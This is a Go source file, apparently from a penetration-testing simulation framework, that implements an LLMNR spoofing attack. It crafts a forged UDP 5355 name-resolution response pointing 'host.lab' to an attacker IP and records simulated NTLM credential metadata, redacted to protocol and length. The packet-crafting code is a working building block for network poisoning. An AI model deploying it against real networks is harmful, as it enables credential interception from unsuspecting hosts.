// llmnr.go implements the LLMNR name-resolution spoofing attack behavior.
//
// Durability (from the catalog): transient-decay. The attack spoofs LLMNR
// responses to inject the attacker's IP as the answer for name-resolution
// queries. The spoofed answers expire (TTL ~30s) — no explicit teardown.
//
// If the attacker observes authentication traffic directed to it (victims
// send SMB/HTTP to the spoofed IP), any captured credential is redacted to
// length+protocol only via [findings.NewSecret] — never the value.

package fh

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/edge/netpen/findings"
	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

type llmnrFinding struct {
	Action   string `json:"action"`
	Query    string `json:"query"`
	Answer   string `json:"answer"`
	TTL      uint32 `json:"ttl"`
	Spoofed  bool   `json:"spoofed"`
	Protocol string `json:"protocol,omitempty"`
	Length   int    `json:"length,omitempty"`
}

// RunLLMNR sends one response for the fixed fixture query and emits simulated
// credential metadata. It does not capture authentication traffic. Craft and
// send failures are returned with operation context.
func RunLLMNR(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()
	qname := "host.lab"
	answerIP := net.IPv4(10, 0, 0, 1)

	// Craft and send the spoofed response (the baseline sniffs for queries
	// and responds; the in-memory shape sends a pre-crafted response).
	responsePkt, err := craftLLMNRResponse(src, qname, answerIP)
	if err != nil {
		return fmt.Errorf("llmnr: craft response: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, responsePkt); err != nil {
		return fmt.Errorf("llmnr: send response: %w", err)
	}

	// Emit the finding. A credential captured by the rogue responder
	// goes through findings.NewSecret: protocol + length only, never
	// the value. The behavior-level test asserts the secret shape.
	//
	// Simulated capture: an NTLM hash observed by the rogue responder.
	captured := []byte("NTLMSSP\x00\x02\x00\x00\x00")
	secret := findings.NewSecret("ntlm", captured)

	detail := llmnrFinding{
		Action:   "llmnr-spoof",
		Query:    qname,
		Answer:   answerIP.String(),
		TTL:      30,
		Spoofed:  true,
		Protocol: secret.Protocol(),
		Length:   secret.Length(),
	}
	detailBytes, _ := json.Marshal(detail)
	deps.Emitter.Finding("llmnr", detailBytes)

	return nil
}

// craftLLMNRResponse builds a spoofed LLMNR response: Ethernet → IPv4 →
// UDP(5355) → DNS response with the attacker's IP.
func craftLLMNRResponse(src net.HardwareAddr, qname string, answerIP net.IP) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       src,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    answerIP,
		DstIP:    net.IPv4(10, 0, 0, 2),
	}
	udp := &layers.UDP{
		SrcPort: 5355,
		DstPort: 5355,
	}
	body := buildDNSResponse(qname, answerIP)
	_ = udp.SetNetworkLayerForChecksum(ip)
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	if err := gopacket.SerializeLayers(buf, opts, eth, ip, udp, gopacket.Payload(body)); err != nil {
		return nil, err
	}
	return append([]byte(nil), buf.Bytes()...), nil
}

func buildDNSResponse(qname string, answerIP net.IP) []byte {
	var buf []byte
	buf = binary.BigEndian.AppendUint16(buf, 0x1234) // ID
	buf = binary.BigEndian.AppendUint16(buf, 0x8000) // flags=response
	buf = binary.BigEndian.AppendUint16(buf, 1)      // QDCOUNT
	buf = binary.BigEndian.AppendUint16(buf, 1)      // ANCOUNT
	buf = binary.BigEndian.AppendUint16(buf, 0)      // NSCOUNT
	buf = binary.BigEndian.AppendUint16(buf, 0)      // ARCOUNT
	for _, label := range splitLabels(qname) {
		buf = append(buf, byte(len(label)))
		buf = append(buf, label...)
	}
	buf = append(buf, 0)                             // root
	buf = binary.BigEndian.AppendUint16(buf, 1)      // QTYPE=A
	buf = binary.BigEndian.AppendUint16(buf, 1)      // QCLASS=IN
	buf = binary.BigEndian.AppendUint16(buf, 0xC00C) // compression pointer
	buf = binary.BigEndian.AppendUint16(buf, 1)      // type A
	buf = binary.BigEndian.AppendUint16(buf, 1)      // class IN
	buf = binary.BigEndian.AppendUint32(buf, 30)     // TTL
	buf = binary.BigEndian.AppendUint16(buf, 4)      // rdlength
	buf = append(buf, answerIP.To4()...)
	return buf
}

func splitLabels(name string) [][]byte {
	var labels [][]byte
	start := 0
	for i := range len(name) {
		if name[i] == '.' {
			labels = append(labels, []byte(name[start:i]))
			start = i + 1
		}
	}
	if start < len(name) {
		labels = append(labels, []byte(name[start:]))
	}
	return labels
}
